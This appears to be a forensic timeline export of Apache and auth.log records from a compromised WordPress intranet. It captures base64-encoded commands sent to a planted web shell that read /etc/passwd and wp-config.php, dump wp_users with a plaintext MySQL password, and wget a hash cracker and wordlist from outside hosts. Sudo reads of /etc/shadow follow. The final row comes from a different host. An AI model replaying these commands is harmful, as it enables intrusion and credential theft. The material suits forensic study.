datetime,timestamp_desc,source,source_long,message,parser,display_name,tag
2022-01-18T12:38:01.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-
2022-01-18T12:38:04.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpZCJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-
2022-01-18T12:38:06.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJuZXRzdGF0IiwgIi10Il0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-
2022-01-18T12:38:08.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9yZXNvbHYuY29uZiJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-
2022-01-18T12:38:09.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpcCIsICJhZGRyIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-
2022-01-18T12:38:11.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJwcyIsICItQSJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-
2022-01-18T12:38:14.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJsc2JfcmVsZWFzZSIsICItYSJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-
2022-01-18T12:38:16.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9ncm91cCJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-
2022-01-18T12:38:17.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9wYXNzd2QiXQ%3D%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-
2022-01-18T12:38:19.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJkYXRlIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-
2022-01-18T12:38:21.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJscyIsICItbGFSIiwgIi92YXIvd3d3Il0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-
2022-01-18T12:38:23.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL3Zhci93d3cvaW50cmFuZXQucHJpY2UuZm94Lm9yZy93cC1jb25maWcucGhwIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-
2022-01-18T12:38:25.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-
2022-01-18T12:38:27.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9wcm9maWxlIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-
2022-01-18T12:38:29.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-
2022-01-18T12:38:32.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: POST / HTTP/1.1 from: 10.35.35.118 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-
2022-01-18T12:39:03.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ0YXIiLCAieHZmeiIsICJ2MC4xLnRhci5neiJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-
2022-01-18T12:39:06.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHA6Ly8xOTIuMTY4LjEzMC43Ny9yb2NreW91LnR4dCJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-
2022-01-18T12:39:11.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAicGhvcGtpbnMiXQ%3D%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-
2022-01-18T12:39:01.000000+00:00,Content Modification Time,LOG,Log File,[sudo] phopkins : TTY=pts/0 ; PWD=/home/phopkins ; USER=root ; COMMAND=/usr/bin/tail /var/log/syslog,text/syslog_traditional,OS:evidences\\\\auth.log,-
2022-01-18T13:14:41.000000+00:00,Content Modification Time,LOG,Log File,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=list,text/syslog_traditional,OS:evidences\\\\auth.log,-
2022-01-18T13:14:43.000000+00:00,Content Modification Time,LOG,Log File,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/ls -laR /root/,text/syslog_traditional,OS:evidences\\\\auth.log,-
2022-01-18T13:14:49.000000+00:00,Content Modification Time,LOG,Log File,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/cat /etc/shadow,text/syslog_traditional,OS:evidences\\\\auth.log,-
2022-01-18T13:14:50.000000+00:00,Content Modification Time,LOG,Log File,[sudo] jwilkinson : TTY=pts/1 ; PWD=/var/www/intranet.hallbrown.wilson.com/wp-content/uploads/2022/02 ; USER=root ; COMMAND=/sbin/iptables -L,text/syslog_traditional,OS:/mnt/d/0experiment/1-1-plaso-sec/data-p-ait-v2-wilson/evidences/auth.log,-
